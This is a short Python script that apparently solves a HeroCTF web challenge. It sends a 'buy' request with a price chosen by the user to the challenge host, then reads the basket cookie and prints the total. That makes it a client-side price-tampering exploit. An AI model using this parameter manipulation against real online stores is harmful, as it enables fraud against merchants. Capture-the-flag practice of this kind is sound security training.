#!/usr/bin/env python3

import re
import sys
import requests

r = requests.post('http://chall2.heroctf.fr:3050/buy', data={'id':'1',"type":'malware',"price":sys.argv[1]})
c = r.headers['Set-Cookie'].split('=')[1].split(';')[0]
r = requests.get('http://chall2.heroctf.fr:3050/basket', cookies={'basket':c})
print(re.findall(r'Total:.*',r.text)[0])